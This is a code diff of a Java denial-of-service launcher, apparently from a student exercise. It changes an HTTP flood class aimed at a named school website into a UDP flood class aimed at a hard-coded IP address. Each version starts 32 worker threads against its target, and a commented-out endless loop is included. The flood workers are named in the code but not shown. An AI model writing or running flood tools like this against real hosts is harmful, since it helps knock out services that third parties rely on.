@@ -1,22 +1,26 @@
-package HTTP_Flood_4;
+package UDP_Flood_6;
 
+import Service_Port_Flood_3.Hilo3;
 import java.io.IOException;
-import java.net.URL;
+import java.net.InetAddress;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
-public class PruebaDoS4 {
+public class PruebaDoS6 {
 
     public static void main(String[] args) throws IOException {
+        InetAddress servidor;
         int n_hilos = 32;
         ExecutorService pool = Executors.newFixedThreadPool(n_hilos);
         try {
-            URL url = new URL("http://www.iesmachado.org/web%20insti/index_v4f.php");
+            servidor = InetAddress.getByName("86.109.162.12");
+            System.out.println("Obtenida ip del servidor");
+            System.out.println(servidor);
             //while(true){
-            for(int i=0; i<n_hilos; i++){
-                pool.execute(new Hilo4(url));
+            for (int i = 0; i < n_hilos; i++) {
+                pool.execute(new Hilo3(servidor));
             }
-        } catch (Exception e) {
+        } catch (IOException e) {
             System.out.println("Error al conectarse con el servidor");
             pool.shutdown();
             System.exit(0);
